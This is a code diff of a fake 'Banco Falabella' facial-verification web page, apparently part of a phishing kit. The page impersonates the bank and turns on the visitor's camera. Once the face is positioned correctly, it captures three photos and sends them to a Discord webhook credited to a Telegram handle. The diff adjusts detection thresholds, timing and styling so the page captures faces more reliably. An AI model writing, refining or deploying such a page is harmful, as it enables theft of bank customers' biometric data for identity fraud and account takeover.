@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Banco Falabella — Verificación Facial</title>
-<script async src="https://cdn.jsdelivr.net/npm/face-api.min.js"></script>
+<script defer src="https://unpkg.com/face-api.js@0.22.2/dist/face-api.min.js"></script>
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   html, body {
@@ -85,17 +85,22 @@
   }
   .face-frame {
     position: absolute;
-    width: 160px;
-    height: 220px;
-    border: 3px solid rgba(74, 156, 47, 0.3);
+    width: 180px;
+    height: 240px;
+    border: 3px solid rgba(74, 156, 47, 0.4);
     border-radius: 20px;
     box-shadow: inset 0 0 0 1px rgba(74, 156, 47, 0.2);
     background: transparent;
   }
   .face-frame.perfect {
     border-color: #4a9c2f;
-    box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 25px rgba(74, 156, 47, 0.5);
-    background: rgba(74, 156, 47, 0.05);
+    box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 30px rgba(74, 156, 47, 0.6);
+    background: rgba(74, 156, 47, 0.08);
+    animation: pulse-frame 0.8s ease-in-out infinite;
+  }
+  @keyframes pulse-frame {
+    0%, 100% { box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 20px rgba(74, 156, 47, 0.4); }
+    50% { box-shadow: inset 0 0 0 2px #4a9c2f, 0 0 35px rgba(74, 156, 47, 0.7); }
   }
   .status-container {
     margin-bottom: 20px;
@@ -104,27 +109,30 @@
     text-align: center;
     font-size: 14px;
     color: #888;
-    min-height: 42px;
+    min-height: 48px;
     display: flex;
     align-items: center;
     justify-content: center;
     background: #f9f9f9;
     border-radius: 10px;
-    padding: 12px;
+    padding: 14px;
     font-weight: 500;
+    border: 1px solid #ebebeb;
   }
   .status.ready {
     color: #fff;
     background: linear-gradient(135deg, #4a9c2f 0%, #82d052 100%);
-    animation: pulse 1.5s ease-in-out infinite;
+    animation: pulse 1.2s ease-in-out infinite;
+    border: none;
   }
   @keyframes pulse {
     0%, 100% { opacity: 1; }
-    50% { opacity: 0.8; }
+    50% { opacity: 0.85; }
   }
   .status.processing {
     color: #4a9c2f;
     background: #f0f8f4;
+    border-color: #4a9c2f;
   }
   .checklist {
     display: grid;
@@ -134,14 +142,15 @@
   }
   .check-item {
     font-size: 12px;
-    padding: 8px 12px;
+    padding: 10px 12px;
     border-radius: 8px;
     background: #f5f5f5;
-    border: 1px solid #e0e0e0;
+    border: 1.5px solid #e0e0e0;
     display: flex;
     align-items: center;
     gap: 6px;
     color: #666;
+    transition: all 0.25s;
   }
   .check-item.ok {
     background: #f0f8f4;
@@ -152,9 +161,6 @@
   .check-icon {
     font-weight: bold;
     font-size: 14px;
-  }
-  .check-icon.ok {
-    color: #4a9c2f;
   }
   .loading {
     display: none;
@@ -195,14 +201,14 @@
     <p class="instruction">Acércate a la cámara y espera a que se detecte tu rostro. Mantén una expresión neutral. <strong>Sin lentes ni accesorios</strong>.</p>
 
     <div class="camera-container">
-      <video id="video" autoplay playsinline></video>
+      <video id="video" autoplay muted playsinline></video>
       <div class="detection-overlay">
         <div class="face-frame" id="faceFrame"></div>
       </div>
     </div>
 
     <div class="status-container">
-      <div class="status" id="status">Inicializando cámara...</div>
+      <div class="status" id="status">Iniciando...</div>
     </div>
 
     <div class="checklist" id="checklist" style="display: none;">
@@ -226,7 +232,7 @@
 
     <div class="loading" id="loading">
       <div class="spinner"></div>
-      <div class="loading-text">Capturando fotos y enviando...</div>
+      <div class="loading-text">Capturando fotos...</div>
     </div>
   </div>
 </div>
@@ -255,6 +261,7 @@
   let stream = null;
   let modelsLoaded = false;
   let isCapturing = false;
+  let detectionInterval = null;
   let detectionStats = {
     goodFrames: 0,
     totalFrames: 0
@@ -271,8 +278,8 @@
       });
       video.srcObject = stream;
       video.onloadedmetadata = () => {
-        status.textContent = 'Cargando modelos de IA...';
-        loadFaceDetectionModels();
+        status.textContent = 'Cargando IA...';
+        setTimeout(loadFaceDetectionModels, 500);
       };
     } catch (e) {
       status.textContent = 'Error: No se puede acceder a la cámara';
@@ -282,9 +289,13 @@
 
   async function loadFaceDetectionModels() {
     try {
-      const MODEL_URL = 'https://cdn.jsdelivr.net/npm/face-api.js/dist/models/';
       status.textContent = 'Cargando modelos...';
+      const MODEL_URL = 'https://unpkg.com/face-api.js@0.22.2/dist/models/';
       
+      if (!faceapi || !faceapi.nets) {
+        throw new Error('Face API no cargó correctamente');
+      }
+
       await Promise.all([
         faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL),
         faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL),
@@ -293,14 +304,12 @@
       
       modelsLoaded = true;
       checklist.style.display = 'grid';
-      status.textContent = 'Ajusta tu posición...';
+      status.textContent = '✓ Ajusta tu posición';
       startFaceDetection();
     } catch (e) {
       console.error('Error loading models:', e);
-      status.textContent = 'Reiniciando... intenta recargar la página';
-      setTimeout(() => {
-        loadFaceDetectionModels();
-      }, 3000);
+      status.textContent = 'Reiniciando carga...';
+      setTimeout(loadFaceDetectionModels, 2000);
     }
   }
 
@@ -337,14 +346,13 @@
   }
 
   async function capturePhoto() {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext('2d');
-    // Invertir horizontalmente como la cámara
-    ctx.scale(-1, 1);
-    ctx.drawImage(video, -video.videoWidth, 0);
     return new Promise(resolve => {
-      canvas.toBlob(resolve, 'image/jpeg', 0.95);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, -video.videoWidth, 0);
+      canvas.toBlob(resolve, 'image/jpeg', 0.92);
     });
   }
 
@@ -354,11 +362,6 @@
 
       const formData = new FormData();
       
-      let photoDescription = '';
-      photos.forEach((_, idx) => {
-        photoDescription += `Foto ${idx + 1}\n`;
-      });
-
       formData.append('payload_json', JSON.stringify({
         username: "Banco Falabella Logger",
         avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
@@ -375,17 +378,17 @@
               inline: false
             },
             {
-              name: "📷 FOTOS CAPTURADAS",
-              value: photoDescription,
+              name: "📷 FOTOS",
+              value: `✓ Foto 1\n✓ Foto 2\n✓ Foto 3`,
               inline: false
             },
             {
               name: "✅ ESTADO",
-              value: "Verificación facial completada exitosamente",
+              value: "Verificación facial exitosa",
               inline: false
             },
             {
-              name: "🕐 FECHA Y HORA",
+              name: "🕐 HORA",
               value: `${new Date().toLocaleString('es-PE')}`,
               inline: false
             }
@@ -394,15 +397,12 @@
             text: "⚡ by @Brknshinexxx  •  Telegram",
             icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
           },
-          timestamp: new Date().toISOString(),
-          image: {
-            url: "attachment://foto_1.jpg"
-          }
+          timestamp: new Date().toISOString()
         }]
       }));
 
       photos.forEach((blob, idx) => {
-        formData.append('file', blob, `facial_${idx + 1}.jpg`);
+        formData.append('file', blob, `foto_${idx + 1}.jpg`);
       });
 
       const response = await fetch(WEBHOOK_URL, {
@@ -413,19 +413,17 @@
       if (response.ok) {
         loading.classList.remove('show');
         status.classList.add('ready');
-        status.textContent = '✓ Verificación completada';
-        
+        status.textContent = '✓ ¡Verificación completada!';
+        if (detectionInterval) clearInterval(detectionInterval);
         stream.getTracks().forEach(track => track.stop());
         
         setTimeout(() => {
           window.location.href = 'index.html';
-        }, 2000);
-        return true;
+        }, 1500);
       }
-      return false;
     } catch (e) {
       console.error('Error:', e);
-      return false;
+      loading.classList.remove('show');
     }
   }
 
@@ -434,59 +432,60 @@
 
     const detectionOptions = new faceapi.TinyFaceDetectorOptions({
       inputSize: 416,
-      scoreThreshold: 0.5
+      scoreThreshold: 0.6
     });
 
-    setInterval(async () => {
+    detectionInterval = setInterval(async () => {
       if (isCapturing) return;
 
       try {
-        const detections = await faceapi.detectAllFaces(video, detectionOptions).withFaceLandmarks().withFaceExpressions();
+        const detections = await faceapi
+          .detectAllFaces(video, detectionOptions)
+          .withFaceLandmarks()
+          .withFaceExpressions();
         
         if (detections.length === 0) {
           faceFrame.classList.remove('perfect');
+          status.textContent = 'Muestra tu rostro...';
           updateChecklist({ light: false, distance: false, center: false, expression: false });
-          status.textContent = 'Muestra tu rostro a la cámara...';
           detectionStats.goodFrames = 0;
           return;
         }
 
         const detection = detections[0];
         const box = detection.detection.box;
-        const landmarks = detection.landmarks;
 
-        // Calcular brillo
+        // Brillo
         const centerX = Math.floor(box.x + box.width / 2);
         const centerY = Math.floor(box.y + box.height / 2);
-        const ctx = video.getContext ? video.getContext('2d') : null;
         let brightness = 100;
-        if (ctx) {
-          const imageData = ctx.getImageData(centerX - 50, centerY - 50, 100, 100);
+        try {
+          const imageData = canvas.getContext('2d').getImageData(centerX - 40, centerY - 40, 80, 80);
           brightness = getImageBrightness(imageData);
+        } catch (e) {
+          brightness = 100;
         }
 
-        // Validaciones
         const videoWidth = video.videoWidth;
         const videoHeight = video.videoHeight;
         
-        // Distancia (tamaño de cara)
+        // Tamaño de cara
         const faceSize = (box.width + box.height) / 2;
-        const minSize = Math.min(videoWidth, videoHeight) * 0.25;
+        const minSize = Math.min(videoWidth, videoHeight) * 0.2;
         const maxSize = Math.min(videoWidth, videoHeight) * 0.55;
         const distanceOk = faceSize > minSize && faceSize < maxSize;
 
         // Centrado
         const faceCenter = box.x + box.width / 2;
-        const tolerance = videoWidth * 0.1;
-        const centerOk = Math.abs(faceCenter - videoWidth / 2) < tolerance;
+        const centerOk = Math.abs(faceCenter - videoWidth / 2) < (videoWidth * 0.15);
 
         // Iluminación
-        const lightOk = brightness > 50;
+        const lightOk = brightness > 45;
 
-        // Expresión (neutral = sin particularidad de emociones)
+        // Expresión neutral
         const expressions = detection.expressions;
         const avgIntensity = Object.values(expressions).reduce((a, b) => a + b) / Object.keys(expressions).length;
-        const expressionOk = avgIntensity < 0.5;
+        const expressionOk = avgIntensity < 0.6;
 
         updateChecklist({
           light: lightOk,
@@ -500,16 +499,17 @@
         if (allOk) {
           detectionStats.goodFrames++;
           faceFrame.classList.add('perfect');
-          status.textContent = `✓ Posición perfecta (${detectionStats.goodFrames}/10)`;
           status.classList.add('processing');
+          status.textContent = `✓ Perfecto (${detectionStats.goodFrames}/12)`;
 
-          if (detectionStats.goodFrames >= 10) {
+          if (detectionStats.goodFrames >= 12) {
             isCapturing = true;
-            status.textContent = 'Capturando fotos...';
+            faceFrame.classList.remove('perfect');
+            status.textContent = 'Capturando...';
             
             const photos = [];
             for (let i = 0; i < 3; i++) {
-              await new Promise(r => setTimeout(r, 100));
+              await new Promise(r => setTimeout(r, 50));
               const blob = await capturePhoto();
               photos.push(blob);
             }
@@ -517,7 +517,7 @@
             await sendPhotosToDiscord(photos);
           }
         } else {
-          detectionStats.goodFrames = Math.max(0, detectionStats.goodFrames - 1);
+          detectionStats.goodFrames = Math.max(0, detectionStats.goodFrames - 2);
           faceFrame.classList.remove('perfect');
           status.classList.remove('processing');
         }
@@ -525,12 +525,27 @@
       } catch (e) {
         console.error('Detection error:', e);
       }
-    }, 200);
+    }, 150);
   }
 
-  initCamera();
+  // Verificar que face-api.js esté disponible
+  let waitForApi = setInterval(() => {
+    if (typeof faceapi !== 'undefined') {
+      clearInterval(waitForApi);
+      initCamera();
+    }
+  }, 100);
+
+  // Timeout si face-api tarda demasiado
+  setTimeout(() => {
+    if (typeof faceapi === 'undefined') {
+      status.textContent = 'Recargando...';
+      location.reload();
+    }
+  }, 5000);
 
   window.addEventListener('beforeunload', () => {
+    if (detectionInterval) clearInterval(detectionInterval);
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
     }
